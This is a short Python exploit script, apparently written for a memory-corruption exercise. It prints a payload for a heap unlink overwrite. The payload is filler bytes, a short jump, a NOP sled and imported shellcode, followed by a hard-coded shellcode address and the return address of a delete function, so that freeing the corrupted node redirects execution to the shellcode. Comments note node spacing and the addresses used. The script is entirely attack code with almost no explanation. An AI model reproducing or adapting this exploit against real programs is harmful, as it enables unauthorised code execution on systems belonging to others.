from shellcode import shellcode 

from struct import pack

# space 0x30 between each node
#return address of delete(c) 0xbffed37c
#shellcode_address 0x080f3750
# The second 4 bytes is courrputed by return address \xeb\x06 short jump 6 bytes to reach shellcode

print("A"*4+" "+"\xeb\x06"+"\x90"*6+shellcode+"\x90"*9+pack("<I",0x080f3750)+pack("<I",0xbffed37c)+" "+"A"*4)


